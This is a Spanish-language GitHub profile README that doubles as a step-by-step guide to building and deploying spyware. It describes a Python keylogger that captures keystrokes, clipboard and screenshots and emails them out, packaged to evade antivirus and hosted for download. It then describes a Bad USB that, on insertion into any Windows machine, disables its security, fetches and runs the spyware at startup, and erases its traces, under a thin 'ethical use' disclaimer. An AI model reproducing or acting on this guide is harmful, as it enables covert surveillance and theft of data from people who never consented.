- 👋 Hi, soy @lKak0l, me gusta comer galletas tostarrica con n0cilla. Soy adicto a la k0kak0la y me gusta mucho el chocolate.
- 👀 Estoy interesado en la naturaleza!
- 🌱 Estudio el HACK (tal cual no digo más)
- 💞️ I’m looking to collaborate on MY CYBERFRIENDS
- 📫 How to reach me ... sushi

<!---
lKak0l dice: que pasa ✨ BRO ✨ este repositorio es el correcto: LÉELO ATENTAMENTE !!!!!!
Yo cree este script basicamente para unos trabajos de la universidad, úsalo con fines éticos bro
--->
Introduccion:
Solo lo he usado en windows 10, y creo que funciona a partir del windows 7.
1º hay que instalar ARDUINO IDE(root), y copiar sus librerias (extensiones) en la carpeta de librerias para compilar perfectamente bien.
2º hay que instalar Visual Studio Code.

Recursos:
PRIMERA PARTE (keyloggerv3.py > keyloggerv3.exe)
Se trata de una aplicacion python para Windows; que lo que hace, es registrar las teclas (KEYLOGGER), el ctrl+c y cada 10 pulsaciones de (ENTER), hace una screeenshot (captura de 
pantalla), y lo envía a un correos (es totalmente configurable; hay que poner la api correspondiente en (resend.api_key = "Tu_aPInUeVaaPInUeVaaPInUeVa"), el correos que envía
("from"), el correos que recibe ("to")  el "subject", "text", y pocas cosas más a simple vista (contras menos cosas  toques mejor), lo graba en un archivo log.txt, y finalmente
lo envía por un correos gmail a uno personalizado.
Dicho archivo python se compila, y se monta en un ejecutable. Despues hay que comprimirlo y subirlo a un HOSTING por FTP (un hosting que sea mejor gratuito)
CODIGO FUENTE KEYLOGGER.py
DESPUÉS. COMPILALO A UN EXE Y COMPRIMELO A ZIP PARA QUE NO SEA DETECTABLE A SIMPLE VISTA POR UN ANTIVIRUS> (0.0)

SEGUNDA PARTE (payload>script.txt)
Ahora ya tenemos el arma principal!
Vamos al BAD USB CJMCU (nuevo, significa tal cual lo compras), lo insertas a tu ordenador, instalamos el paquete oficial de Arduino https://downloads.arduino.cc/arduino-ide/nightly
/arduino-ide_nightly-latest_Windows_64bit.zip  
Abrimos Arduino, cargamos el script de https://github.com/Seytonic/Duckduino-microSD/blob/master/Duckduino-microSD/Duckduino-microSD.ino (tendrás que cambiar el código en la línea
27, y poner Keyboard.begin(KeyboardLayout_es_ES); y despues subirlo a nuestra placa cjmcu bad usb)
Despues puedes ejecutarlo para provarlo (mejor usar un SO virtual para no alterar tu entorno de trabajo)

Resultado:
Ahora tu BAD USB CJMCU, tendrá la función correcta: al insertarla en cualquier maquina con Windows; ejecutará una serie de comandos para deshabilitar su seguridad, descargara
un spyware comprimido, lo descomprimirá, lo ejecutará en inicio de Windows y borrara los comandos usados.

DISFRUTALO. SALUDOS


